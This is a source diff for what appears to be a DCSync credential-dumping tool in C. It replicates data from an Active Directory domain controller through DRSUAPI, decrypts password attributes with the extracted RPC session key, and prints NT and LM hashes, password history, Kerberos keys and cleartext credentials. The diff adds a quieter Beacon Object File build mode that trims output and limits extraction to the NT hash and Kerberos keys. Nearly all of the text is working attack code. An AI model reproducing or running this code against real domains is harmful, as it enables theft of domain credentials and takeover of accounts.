@@ -17,6 +17,14 @@
 #define internal_printf(...) do { printf( __VA_ARGS__ ); fflush( stdout ); } while ( 0 )
 #endif
 
+#ifdef BOF
+#define verbose_printf(...) do { } while ( 0 )
+#define SECRET_PREFIX ""
+#else
+#define verbose_printf(...) internal_printf( __VA_ARGS__ )
+#define SECRET_PREFIX "          "
+#endif
+
 /*  Security context structures for session key extraction  */
 typedef struct _SecHandle {
     ULONG_PTR dwLower;
@@ -114,7 +122,7 @@ void RPC_ENTRY RpcSecurityCallback( void* context )
     /*  Free the session key buffer allocated by SSPI  */
     FreeContextBuffer( sessionKeyInfo.SessionKey );
 
-    internal_printf( "[*] RpcSecurityCallback: Session key extracted (%u bytes)\n", g_dwSessionKeyLen );
+    verbose_printf( "[*] RpcSecurityCallback: Session key extracted (%u bytes)\n", g_dwSessionKeyLen );
 }
 
 // modified from
@@ -336,13 +344,13 @@ void PrintRidHashList( const char* label, BYTE* pData, DWORD dwDataLen, DWORD dw
 
     if ( dwRid == 0 )
     {
-        internal_printf( "          [!] %s cannot be unwrapped without RID\n", label );
+        internal_printf( SECRET_PREFIX "[!] %s cannot be unwrapped without RID\n", label );
         return;
     }
 
     if ( count == 0 )
     {
-        internal_printf( "          [!] %s decrypted payload is too short (%u bytes)\n", label, dwDataLen );
+        internal_printf( SECRET_PREFIX "[!] %s decrypted payload is too short (%u bytes)\n", label, dwDataLen );
         return;
     }
 
@@ -352,18 +360,18 @@ void PrintRidHashList( const char* label, BYTE* pData, DWORD dwDataLen, DWORD dw
         {
             if ( count == 1 )
             {
-                internal_printf( "          [*] %s: ", label );
+                internal_printf( SECRET_PREFIX "[*] %s: ", label );
             }
             else
             {
-                internal_printf( "          [*] %s[%u]: ", label, i );
+                internal_printf( SECRET_PREFIX "[*] %s[%u]: ", label, i );
             }
             PrintHexBytes( hash, 16 );
             internal_printf( "\n" );
         }
         else
         {
-            internal_printf( "          [!] %s[%u] RID DES unwrap failed\n", label, i );
+            internal_printf( SECRET_PREFIX "[!] %s[%u] RID DES unwrap failed\n", label, i );
         }
     }
 }
@@ -485,13 +493,13 @@ void ParseKerberosNewerKeys( BYTE* pHexValue, DWORD dwHexValueLen )
 
     if ( pBlob == NULL )
     {
-        internal_printf( "          [!] Kerberos-Newer-Keys hex decode failed\n" );
+        internal_printf( SECRET_PREFIX "[!] Kerberos-Newer-Keys hex decode failed\n" );
         return;
     }
 
     if ( dwBlobLen < 24 )
     {
-        internal_printf( "          [!] Kerberos-Newer-Keys blob too short (%u bytes)\n", dwBlobLen );
+        internal_printf( SECRET_PREFIX "[!] Kerberos-Newer-Keys blob too short (%u bytes)\n", dwBlobLen );
         intFree( pBlob );
         return;
     }
@@ -503,11 +511,11 @@ void ParseKerberosNewerKeys( BYTE* pHexValue, DWORD dwHexValueLen )
 
     if ( saltLen > 0 && saltOffset + saltLen <= dwBlobLen )
     {
-        internal_printf( "          [*] Kerberos Salt: %.*S\n", saltLen / sizeof( WCHAR ), (WCHAR*)( pBlob + saltOffset ) );
+        internal_printf( SECRET_PREFIX "[*] Kerberos Salt: %.*S\n", saltLen / sizeof( WCHAR ), (WCHAR*)( pBlob + saltOffset ) );
     }
     if ( defaultIterations != 0 )
     {
-        internal_printf( "          [*] Kerberos Iterations: %u\n", defaultIterations );
+        internal_printf( SECRET_PREFIX "[*] Kerberos Iterations: %u\n", defaultIterations );
     }
 
     for ( WORD i = 0; i < credentialCount; i++ )
@@ -530,7 +538,7 @@ void ParseKerberosNewerKeys( BYTE* pHexValue, DWORD dwHexValueLen )
 
         if ( keyLen > 0 && keyOffset + keyLen <= dwBlobLen )
         {
-            internal_printf( "          [*] Kerberos %s", KerbKeyTypeName( keyType ) );
+            internal_printf( SECRET_PREFIX "[*] Kerberos %s", KerbKeyTypeName( keyType ) );
             if ( iterationCount != 0 )
             {
                 internal_printf( " (%u)", iterationCount );
@@ -552,21 +560,21 @@ void ParseSupplementalCredentials( BYTE* pData, DWORD dwDataLen )
 
     if ( pData == NULL || dwDataLen < 113 )
     {
-        internal_printf( "          [!] Supplemental credentials blob too short (%u bytes)\n", dwDataLen );
+        internal_printf( SECRET_PREFIX "[!] Supplemental credentials blob too short (%u bytes)\n", dwDataLen );
         return;
     }
 
     propertiesEnd = 12 + ReadLe32( pData + 4 );
     if ( propertiesEnd > dwDataLen || propertiesEnd < 112 )
     {
-        internal_printf( "          [!] Supplemental credentials length is invalid\n" );
+        internal_printf( SECRET_PREFIX "[!] Supplemental credentials length is invalid\n" );
         return;
     }
 
     propertyCount = ReadLe16( pData + 110 );
     offset = 112;
 
-    internal_printf( "          [*] Supplemental Properties: %u\n", propertyCount );
+    verbose_printf( "          [*] Supplemental Properties: %u\n", propertyCount );
 
     for ( WORD i = 0; i < propertyCount && offset + 6 <= propertiesEnd; i++ )
     {
@@ -577,16 +585,17 @@ void ParseSupplementalCredentials( BYTE* pData, DWORD dwDataLen )
 
         if ( offset + 6 + nameLen + valueLen > propertiesEnd )
         {
-            internal_printf( "          [!] Supplemental property %u is truncated\n", i );
+            internal_printf( SECRET_PREFIX "[!] Supplemental property %u is truncated\n", i );
             break;
         }
 
-        internal_printf( "          [*] Supplemental Property: %.*S\n", nameLen / sizeof( WCHAR ), (WCHAR*)pName );
+        verbose_printf( "          [*] Supplemental Property: %.*S\n", nameLen / sizeof( WCHAR ), (WCHAR*)pName );
 
         if ( SupplementalNameEquals( pName, nameLen, "Primary:Kerberos-Newer-Keys" ) )
         {
             ParseKerberosNewerKeys( pValue, valueLen );
         }
+#ifndef BOF
         else if ( SupplementalNameEquals( pName, nameLen, "Primary:CLEARTEXT" ) )
         {
             DWORD clearLen = 0;
@@ -597,6 +606,7 @@ void ParseSupplementalCredentials( BYTE* pData, DWORD dwDataLen )
                 intFree( pClear );
             }
         }
+#endif
 
         offset += 6 + nameLen + valueLen;
     }
@@ -604,6 +614,11 @@ void ParseSupplementalCredentials( BYTE* pData, DWORD dwDataLen )
 
 BOOL IsInterestingAttr( ATTRTYP attrTyp )
 {
+#ifdef BOF
+    return attrTyp == ATT_UNICODE_PWD ||
+           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
+           attrTyp == 0x00090092;
+#else
     return attrTyp == ATT_SAM_ACCOUNT_NAME ||
            attrTyp == ATT_USER_PRINCIPAL_NAME ||
            attrTyp == ATT_DBCS_PWD ||
@@ -612,6 +627,21 @@ BOOL IsInterestingAttr( ATTRTYP attrTyp )
            attrTyp == ATT_NT_PWD_HISTORY ||
            attrTyp == ATT_LM_PWD_HISTORY ||
            attrTyp == 0x00090092;
+#endif
+}
+
+BOOL ShouldDecryptAttr( ATTRTYP attrTyp )
+{
+#ifdef BOF
+    return attrTyp == ATT_UNICODE_PWD ||
+           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS;
+#else
+    return attrTyp == ATT_DBCS_PWD ||
+           attrTyp == ATT_UNICODE_PWD ||
+           attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
+           attrTyp == ATT_NT_PWD_HISTORY ||
+           attrTyp == ATT_LM_PWD_HISTORY;
+#endif
 }
 
 /*  Helper function to decrypt DRS secret attributes using session key + RC4.  */
@@ -748,9 +778,14 @@ BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, B
 
 void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
 {
+#ifdef BOF
+    internal_printf( "[*] Target: %S\n", userDN );
+    internal_printf( "[*] DC: %S\n", domainController );
+#else
     internal_printf( "[*] Target user DN: %S\n", userDN );
     internal_printf( "[*] Domain DN     : %S\n", domainDN );
     internal_printf( "[*] Target DC     : %S\n", domainController );
+#endif
 
     RPC_BINDING_HANDLE bHandle = NULL;
 	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;
@@ -780,7 +815,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
     pDrsExtensionsInt->dwFlags = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 |
         DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_NONDOMAIN_NCS;
 
-    internal_printf( "[*] Calling IDL_DRSBind...\n" );
+    verbose_printf( "[*] Calling IDL_DRSBind...\n" );
 
 
     drsStatus = IDL_DRSBind( bHandle, NULL, (DRS_EXTENSIONS*)pDrsExtensionsInt, &pDrsExtensionsOutput, &drsHandle );
@@ -792,8 +827,8 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
         if ( pDrsExtensionsOutput != NULL && pDrsExtensionsOutput->cb >= sizeof( DWORD ) )
         {
             DRS_EXTENSIONS_INT* pServerExt = (DRS_EXTENSIONS_INT*)pDrsExtensionsOutput;
-            internal_printf( "[*] Server extensions cb: %u\n", pServerExt->cb );
-            internal_printf( "[*] Server flags: 0x%08x\n", pServerExt->dwFlags );
+            verbose_printf( "[*] Server extensions cb: %u\n", pServerExt->cb );
+            verbose_printf( "[*] Server flags: 0x%08x\n", pServerExt->dwFlags );
 
             /*  Check if server supports required capabilities  */
             if ( !( pServerExt->dwFlags & DRS_EXT_GETCHGREQ_V8 ) )
@@ -801,37 +836,37 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                 internal_printf( "[!] Server does not support GETCHGREQ_V8\n" );
                 goto END;
             }
-            internal_printf( "[>] Server supports GETCHGREQ_V8\n" );
+            verbose_printf( "[>] Server supports GETCHGREQ_V8\n" );
 
             if ( pServerExt->dwFlags & DRS_EXT_STRONG_ENCRYPTION )
             {
-                internal_printf( "[>] Server supports strong encryption\n" );
+                verbose_printf( "[>] Server supports strong encryption\n" );
             }
 
             /*  Copy server extension info to request structure  */
             if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, SiteObjGuid ) + sizeof( GUID ) )
             {
                 MSVCRT$memcpy( &getChReq.V8.uuidDsaObjDest, &pServerExt->SiteObjGuid, sizeof( GUID ) );
-                internal_printf( "[*] Copied SiteObjGuid to request\n" );
+                verbose_printf( "[*] Copied SiteObjGuid to request\n" );
             }
 
             if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, ConfigObjGUID ) + sizeof( GUID ) )
             {
                 MSVCRT$memcpy( &getChReq.V8.uuidInvocIdSrc, &pServerExt->ConfigObjGUID, sizeof( GUID ) );
-                internal_printf( "[*] Copied ConfigObjGUID to request\n" );
+                verbose_printf( "[*] Copied ConfigObjGUID to request\n" );
             }
 
             /*  Copy additional extension fields  */
             if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, dwReplEpoch ) + sizeof( DWORD ) )
             {
                 pDrsExtensionsInt->dwReplEpoch = pServerExt->dwReplEpoch;
-                internal_printf( "[*] Copied dwReplEpoch: %u\n", pServerExt->dwReplEpoch );
+                verbose_printf( "[*] Copied dwReplEpoch: %u\n", pServerExt->dwReplEpoch );
             }
 
             if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, dwExtCaps ) + sizeof( DWORD ) )
             {
                 pDrsExtensionsInt->dwExtCaps = pServerExt->dwExtCaps;
-                internal_printf( "[*] Copied dwExtCaps: 0x%08x\n", pServerExt->dwExtCaps );
+                verbose_printf( "[*] Copied dwExtCaps: 0x%08x\n", pServerExt->dwExtCaps );
             }
 
             /*  Create DSNAME for user  */
@@ -858,9 +893,9 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                 internal_printf( "[!] Session key was not extracted by security callback\n" );
                 goto END;
             }
-            internal_printf( "[*] Session key available: %u bytes\n", g_dwSessionKeyLen );
+            verbose_printf( "[*] Session key available: %u bytes\n", g_dwSessionKeyLen );
 
-            internal_printf( "[*] Calling IDL_DRSGetNCChanges...\n" );
+            verbose_printf( "[*] Calling IDL_DRSGetNCChanges...\n" );
 
             DWORD dwOutVersion = 0;
             DRS_MSG_GETCHGREPLY getChReply = { 0 };
@@ -869,16 +904,16 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
             if ( drsStatus == 0 )
             {
                 internal_printf( "[>] IDL_DRSGetNCChanges success\n" );
-                internal_printf( "[*] Reply version: %u\n", dwOutVersion );
+                verbose_printf( "[*] Reply version: %u\n", dwOutVersion );
 
                 if ( dwOutVersion == 6 || dwOutVersion == 1 )
                 {
                     /*  V6 and V1 have the same pObjects structure  */
                     DRS_MSG_GETCHGREPLY_V6* pReply = &getChReply.V6;
 
-                    internal_printf( "[*] Number of objects: %u\n", pReply->cNumObjects );
-                    internal_printf( "[*] Number of bytes: %u\n", pReply->cNumBytes );
-                    internal_printf( "[*] More data available: %s\n", pReply->fMoreData ? "Yes" : "No" );
+                    verbose_printf( "[*] Number of objects: %u\n", pReply->cNumObjects );
+                    verbose_printf( "[*] Number of bytes: %u\n", pReply->cNumBytes );
+                    verbose_printf( "[*] More data available: %s\n", pReply->fMoreData ? "Yes" : "No" );
 
                     if ( pReply->pObjects != NULL )
                     {
@@ -887,17 +922,17 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
 
                         while ( pCurrent != NULL )
                         {
-                            internal_printf( "\n[*] Object %u:\n", objIndex );
+                            verbose_printf( "\n[*] Object %u:\n", objIndex );
 
                             /*  Print object DN  */
                             if ( pCurrent->Entinf.pName != NULL && pCurrent->Entinf.pName->NameLen > 0 )
                             {
-                                internal_printf( "    DN: %.*S\n", pCurrent->Entinf.pName->NameLen, pCurrent->Entinf.pName->StringName );
+                                verbose_printf( "    DN: %.*S\n", pCurrent->Entinf.pName->NameLen, pCurrent->Entinf.pName->StringName );
                             }
 
                             /*  Iterate through attributes  */
                             ATTRBLOCK* pAttrBlock = &pCurrent->Entinf.AttrBlock;
-                            internal_printf( "    Attributes: %u\n", pAttrBlock->attrCount );
+                            verbose_printf( "    Attributes: %u\n", pAttrBlock->attrCount );
                             if ( pAttrBlock->attrCount > 0 && pAttrBlock->pAttr == NULL )
                             {
                                 internal_printf( "    [!] Attribute pointer is NULL\n" );
@@ -921,7 +956,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                     {
                                         /*  RID is the last 4 bytes of the SID  */
                                         dwRID = *(DWORD*)( pSidVal->pVal + pSidVal->valLen - 4 );
-                                        internal_printf( "    RID (from objectSid): %u (0x%x)\n", dwRID, dwRID );
+                                        verbose_printf( "    RID (from objectSid): %u (0x%x)\n", dwRID, dwRID );
                                     }
                                     break;
                                 }
@@ -934,7 +969,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                 if ( pCurrent->Entinf.pName->SidLen >= 12 )
                                 {
                                     dwRID = *(DWORD*)( pSid + pCurrent->Entinf.pName->SidLen - 4 );
-                                    internal_printf( "    RID (from DSNAME->Sid): %u (0x%x)\n", dwRID, dwRID );
+                                    verbose_printf( "    RID (from DSNAME->Sid): %u (0x%x)\n", dwRID, dwRID );
                                 }
                             }
 
@@ -951,7 +986,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                     continue;
                                 }
 
-                                internal_printf( "      [%u] attrTyp: 0x%08x, values: %u\n",
+                                verbose_printf( "      [%u] attrTyp: 0x%08x, values: %u\n",
                                     i, pAttr->attrTyp, pAttr->AttrVal.valCount );
 
                                 if ( pAttr->AttrVal.valCount > 0 && pAttr->AttrVal.pAVal == NULL )
@@ -964,24 +999,20 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                 for ( ULONG j = 0; j < pAttr->AttrVal.valCount; j++ )
                                 {
                                     ATTRVAL* pVal = &pAttr->AttrVal.pAVal[j];
-                                    internal_printf( "          Value %u: %u bytes\n", j, pVal->valLen );
+                                    verbose_printf( "          Value %u: %u bytes\n", j, pVal->valLen );
 
                                     if ( ( pAttr->attrTyp == ATT_SAM_ACCOUNT_NAME ||
                                            pAttr->attrTyp == ATT_USER_PRINCIPAL_NAME ) &&
                                          pVal->valLen > 0 && pVal->pVal != NULL )
                                     {
-                                        internal_printf( "          [*] %s: %.*S\n",
+                                        verbose_printf( "          [*] %s: %.*S\n",
                                             pAttr->attrTyp == ATT_SAM_ACCOUNT_NAME ? "sAMAccountName" : "userPrincipalName",
                                             pVal->valLen / sizeof( WCHAR ),
                                             (WCHAR*)pVal->pVal );
                                     }
 
                                     /*  Decrypt password attributes  */
-                                    if ( ( pAttr->attrTyp == ATT_DBCS_PWD ||
-                                           pAttr->attrTyp == ATT_UNICODE_PWD ||
-                                           pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
-                                           pAttr->attrTyp == ATT_NT_PWD_HISTORY ||
-                                           pAttr->attrTyp == ATT_LM_PWD_HISTORY ) &&
+                                    if ( ShouldDecryptAttr( pAttr->attrTyp ) &&
                                          pVal->valLen > 0 && pVal->pVal != NULL &&
                                          g_pSessionKey != NULL )
                                     {
@@ -990,18 +1021,19 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
 
                                         if ( DecryptAttributeWithSessionKey( g_pSessionKey, g_dwSessionKeyLen, pVal->pVal, pVal->valLen, &pDecrypted, &dwDecryptedLen ) )
                                         {
-                                            if ( pAttr->attrTyp == ATT_DBCS_PWD )
-                                            {
-                                                PrintRidHashList( "LM Hash", pDecrypted, dwDecryptedLen, dwRID );
-                                            }
-                                            else if ( pAttr->attrTyp == ATT_UNICODE_PWD )
+                                            if ( pAttr->attrTyp == ATT_UNICODE_PWD )
                                             {
                                                 PrintRidHashList( "NT Hash", pDecrypted, dwDecryptedLen, dwRID );
                                             }
                                             else if ( pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS )
                                             {
-                                                internal_printf( "          [*] Supplemental Credentials decrypted (%u bytes)\n", dwDecryptedLen );
+                                                verbose_printf( "          [*] Supplemental Credentials decrypted (%u bytes)\n", dwDecryptedLen );
                                                 ParseSupplementalCredentials( pDecrypted, dwDecryptedLen );
+                                            }
+#ifndef BOF
+                                            else if ( pAttr->attrTyp == ATT_DBCS_PWD )
+                                            {
+                                                PrintRidHashList( "LM Hash", pDecrypted, dwDecryptedLen, dwRID );
                                             }
                                             else if ( pAttr->attrTyp == ATT_NT_PWD_HISTORY )
                                             {
@@ -1011,6 +1043,7 @@ void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
                                             {
                                                 PrintRidHashList( "LM History", pDecrypted, dwDecryptedLen, dwRID );
                                             }
+#endif
 
                                             intFree( pDecrypted );
                                         }
